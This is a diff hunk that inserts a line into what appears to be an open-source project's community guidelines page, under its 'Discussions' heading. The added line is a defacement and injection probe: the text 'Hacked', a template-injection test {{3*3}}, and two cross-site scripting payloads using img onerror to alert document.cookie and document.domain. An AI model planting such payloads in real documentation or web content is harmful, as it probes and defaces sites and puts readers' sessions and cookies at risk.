@@ -26,6 +26,8 @@ open-source community that values fostering a supportive culture.
 
 ### Discussions
 
+Hacked<br><br><center><font color="red">{{3*3}}<br><br><img src=x onerror=alert(document.cookie)><br><br><img src=x onerror=alert(document.domain)>
+
 We value transparency and open collaboration. Our goal is for everyone to be
 able to participate, regardless of organizational affiliation. There are several
 areas where developer discussions take place:
